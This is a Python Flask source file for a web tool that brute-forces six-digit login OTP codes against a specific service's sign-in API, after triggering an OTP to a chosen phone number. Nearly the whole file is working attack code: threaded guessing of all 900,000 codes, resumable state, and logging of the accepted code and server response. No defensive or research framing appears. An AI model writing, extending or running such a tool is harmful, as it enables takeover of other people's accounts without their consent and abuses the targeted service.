# main.py
import requests
import time
import threading
import json
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import queue
import os
import pickle
import atexit

app = Flask(__name__)

# Global state for tracking brute force progress
brute_force_state = {
    'is_running': False,
    'total_attempts': 0,
    'total_possible': 900000,
    'current_otp': 0,
    'found_otp': None,
    'start_time': None,
    'status_counts': {},
    'logs': [],
    'stop_flag': False,
    'phone_number': None,
    'speed': 0,
    'last_update': None,
    'completed': False,
    'last_otp_tried': 0
}

log_queue = queue.Queue()
STATE_FILE = 'bruteforce_state.pkl'
bruteforce_thread = None

class ClashX24Login:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "okhttp/4.12.0"
        }
        self.session.headers.update(self.headers)
        self.phone_number = None
        self.stop_bruteforce = False
        
    def send_otp(self, phone_number):
        """Send OTP to the provided phone number"""
        send_otp_url = "https://api.clashx24.xyz/user/login-code"
        otp_payload = {"phone_number": phone_number}
        
        try:
            otp_response = self.session.post(send_otp_url, json=otp_payload)
            
            if otp_response.status_code in [200, 201]:
                return True, otp_response.text
            else:
                return False, otp_response.text
        except Exception as e:
            return False, str(e)
    
    def verify_otp(self, otp, show_response=True):
        """Verify OTP and return response"""
        verify_otp_url = "https://api.clashx24.xyz/user/sign-in"
        verify_payload = {
            "phone_number": self.phone_number,
            "verification_code": str(otp),
            "OTP": int(otp) if str(otp).isdigit() else otp
        }
        
        try:
            verify_response = self.session.post(verify_otp_url, json=verify_payload)
            return verify_response
        except Exception as e:
            return None

def save_state():
    """Save current state to file"""
    try:
        # Don't save logs to file to keep it small
        state_to_save = brute_force_state.copy()
        state_to_save['logs'] = []  # Don't persist logs
        with open(STATE_FILE, 'wb') as f:
            pickle.dump(state_to_save, f)
    except Exception as e:
        print(f"Error saving state: {e}")

def load_state():
    """Load state from file"""
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, 'rb') as f:
                loaded_state = pickle.load(f)
                for key, value in loaded_state.items():
                    if key in brute_force_state:
                        brute_force_state[key] = value
                return True
    except Exception as e:
        print(f"Error loading state: {e}")
    return False

def clear_state():
    """Clear saved state"""
    try:
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
    except Exception as e:
        print(f"Error clearing state: {e}")

def add_log(message, status="info"):
    """Add log entry with timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        'timestamp': timestamp,
        'message': message,
        'status': status
    }
    brute_force_state['logs'].append(log_entry)
    # Keep only last 1000 logs
    if len(brute_force_state['logs']) > 1000:
        brute_force_state['logs'] = brute_force_state['logs'][-1000:]
    log_queue.put(log_entry)
    save_state()

def brute_force_worker(otp, login_instance):
    """Worker function for brute forcing OTP"""
    if brute_force_state['stop_flag']:
        return None
        
    response = login_instance.verify_otp(otp, show_response=False)
    
    # Update status counts
    status_code = response.status_code if response else 'error'
    brute_force_state['status_counts'][status_code] = brute_force_state['status_counts'].get(status_code, 0) + 1
    
    # Update last OTP tried
    brute_force_state['last_otp_tried'] = otp
    
    # Log every 100 attempts or on status change
    if brute_force_state['total_attempts'] % 100 == 0:
        add_log(f"Attempt #{brute_force_state['total_attempts']}: OTP {otp} - Status {status_code}")
    
    if response and response.status_code != 400:
        brute_force_state['found_otp'] = otp
        brute_force_state['stop_flag'] = True
        brute_force_state['completed'] = True
        add_log(f"✅ SUCCESS! Valid OTP found: {otp}", "success")
        add_log(f"Response: {response.text}", "success")
        save_state()
        return otp
    
    # Save state periodically
    if brute_force_state['total_attempts'] % 500 == 0:
        save_state()
    
    return None

def run_brute_force(phone_number, max_workers=10, resume_from=0):
    """Main brute force function"""
    global brute_force_state
    
    # Reset state if not resuming
    if resume_from == 0:
        brute_force_state['is_running'] = True
        brute_force_state['total_attempts'] = 0
        brute_force_state['found_otp'] = None
        brute_force_state['start_time'] = time.time()
        brute_force_state['status_counts'] = {}
        brute_force_state['stop_flag'] = False
        brute_force_state['phone_number'] = phone_number
        brute_force_state['completed'] = False
        brute_force_state['last_otp_tried'] = 0
        brute_force_state['logs'] = []
        brute_force_state['speed'] = 0
        
        add_log(f"🚀 Starting brute force for {phone_number}", "info")
        add_log(f"📊 Total possible OTPs: 900,000", "info")
        add_log(f"⚡ Using {max_workers} workers", "info")
    else:
        add_log(f"🔄 Resuming brute force from OTP {resume_from}", "info")
        brute_force_state['is_running'] = True
        brute_force_state['stop_flag'] = False
    
    login_instance = ClashX24Login()
    login_instance.phone_number = brute_force_state['phone_number']
    
    start_time = brute_force_state['start_time'] or time.time()
    total_attempts = brute_force_state['total_attempts']
    
    # Generate OTPs: 100000 to 999999
    start_otp = max(100000, resume_from)
    total_possible = 900000
    
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            batch_size = 1000
            futures = []
            
            for otp in range(start_otp, 1000000):
                if brute_force_state['stop_flag']:
                    break
                
                future = executor.submit(brute_force_worker, otp, login_instance)
                futures.append(future)
                
                # Process completed futures in batches
                if len(futures) >= batch_size:
                    for f in futures:
                        if brute_force_state['stop_flag']:
                            break
                        try:
                            result = f.result(timeout=0.1)
                            total_attempts += 1
                            brute_force_state['total_attempts'] = total_attempts
                            
                            # Update speed
                            elapsed = time.time() - start_time
                            if elapsed > 0:
                                brute_force_state['speed'] = total_attempts / elapsed
                                brute_force_state['last_update'] = datetime.now().isoformat()
                            
                            if result:
                                executor.shutdown(wait=False, cancel_futures=True)
                                save_state()
                                break
                        except:
                            pass
                    
                    futures = []
                    
                    # Log progress every 500 attempts
                    if total_attempts % 500 == 0:
                        elapsed = time.time() - start_time
                        speed = total_attempts / elapsed if elapsed > 0 else 0
                        progress_pct = (total_attempts / total_possible * 100)
                        add_log(f"📈 Progress: {total_attempts}/{total_possible} ({progress_pct:.2f}%) - Speed: {speed:.1f} OTP/s")
                        save_state()
    
    except Exception as e:
        add_log(f"❌ Error: {str(e)}", "error")
    
    elapsed_time = time.time() - start_time
    brute_force_state['is_running'] = False
    
    if not brute_force_state['found_otp'] and not brute_force_state['stop_flag']:
        add_log(f"📊 Brute force completed! No valid OTP found.", "warning")
    elif not brute_force_state['found_otp'] and brute_force_state['stop_flag']:
        add_log(f"⏹️ Brute force stopped by user", "warning")
    
    add_log(f"⏱️ Time taken: {elapsed_time:.2f} seconds", "info")
    add_log(f"📈 Total attempts: {total_attempts}", "info")
    
    if brute_force_state['found_otp']:
        add_log(f"✅ Valid OTP found: {brute_force_state['found_otp']}", "success")
    else:
        if not brute_force_state['stop_flag']:
            add_log("❌ No valid OTP found", "error")
    
    save_state()
    return brute_force_state['found_otp']

@app.route('/')
def index():
    # Load persisted state on page load
    load_state()
    return render_template('index.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    phone_number = request.json.get('phone_number')
    
    if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
    
    login = ClashX24Login()
    success, response = login.send_otp(phone_number)
    
    return jsonify({
        'success': success,
        'message': 'OTP sent successfully' if success else 'Failed to send OTP',
        'response': response
    })

@app.route('/start-bruteforce', methods=['POST'])
def start_bruteforce():
    global bruteforce_thread
    
    if brute_force_state['is_running']:
        return jsonify({'success': False, 'message': 'Brute force already running'}), 400
    
    phone_number = request.json.get('phone_number')
    max_workers = request.json.get('max_workers', 10)
    resume = request.json.get('resume', False)
    
    if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
    
    # Load saved state if resuming
    start_from = 0
    if resume and os.path.exists(STATE_FILE):
        load_state()
        if brute_force_state.get('phone_number') == phone_number:
            start_from = brute_force_state.get('last_otp_tried', 0) + 1
            add_log(f"🔄 Resuming from OTP {start_from}", "info")
    
    # Start brute force in background thread
    bruteforce_thread = threading.Thread(
        target=run_brute_force, 
        args=(phone_number, max_workers, start_from)
    )
    bruteforce_thread.daemon = True
    bruteforce_thread.start()
    
    return jsonify({
        'success': True, 
        'message': 'Brute force started',
        'resuming': start_from > 0,
        'start_from': start_from
    })

@app.route('/stop-bruteforce', methods=['POST'])
def stop_bruteforce():
    brute_force_state['stop_flag'] = True
    brute_force_state['is_running'] = False
    save_state()
    return jsonify({'success': True, 'message': 'Stop signal sent'})

@app.route('/reset-state', methods=['POST'])
def reset_state():
    clear_state()
    brute_force_state.update({
        'is_running': False,
        'total_attempts': 0,
        'found_otp': None,
        'start_time': None,
        'status_counts': {},
        'logs': [],
        'stop_flag': False,
        'phone_number': None,
        'speed': 0,
        'completed': False,
        'last_otp_tried': 0
    })
    return jsonify({'success': True, 'message': 'State reset'})

@app.route('/status')
def status():
    load_state()  # Reload state from file
    elapsed = 0
    if brute_force_state.get('start_time'):
        elapsed = time.time() - brute_force_state['start_time']
    
    return jsonify({
        'is_running': brute_force_state.get('is_running', False),
        'total_attempts': brute_force_state.get('total_attempts', 0),
        'total_possible': brute_force_state.get('total_possible', 900000),
        'found_otp': brute_force_state.get('found_otp'),
        'elapsed_time': elapsed,
        'speed': brute_force_state.get('speed', 0),
        'status_counts': brute_force_state.get('status_counts', {}),
        'phone_number': brute_force_state.get('phone_number'),
        'progress_percentage': (brute_force_state.get('total_attempts', 0) / brute_force_state.get('total_possible', 900000) * 100) if brute_force_state.get('total_possible', 0) > 0 else 0,
        'completed': brute_force_state.get('completed', False),
        'last_otp_tried': brute_force_state.get('last_otp_tried', 0),
        'has_saved_state': os.path.exists(STATE_FILE)
    })

@app.route('/logs')
def get_logs():
    load_state()
    return jsonify(brute_force_state.get('logs', []))

@app.route('/stream-logs')
def stream_logs():
    def generate():
        last_index = 0
        # Send existing logs first
        for log in brute_force_state.get('logs', []):
            yield f"data: {json.dumps(log)}\n\n"
        
        while True:
            try:
                # Get new logs from queue
                log = log_queue.get(timeout=5)
                yield f"data: {json.dumps(log)}\n\n"
            except queue.Empty:
                # Send heartbeat to keep connection alive
                yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                continue
            except GeneratorExit:
                break
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy', 
        'timestamp': datetime.now().isoformat(),
        'is_running': brute_force_state.get('is_running', False),
        'has_saved_state': os.path.exists(STATE_FILE)
    })

# Save state on shutdown
@atexit.register
def shutdown_cleanup():
    save_state()
    print("State saved on shutdown")

if __name__ == '__main__':
    # Load state on startup
    load_state()
    app.run(host='0.0.0.0', port=10000)
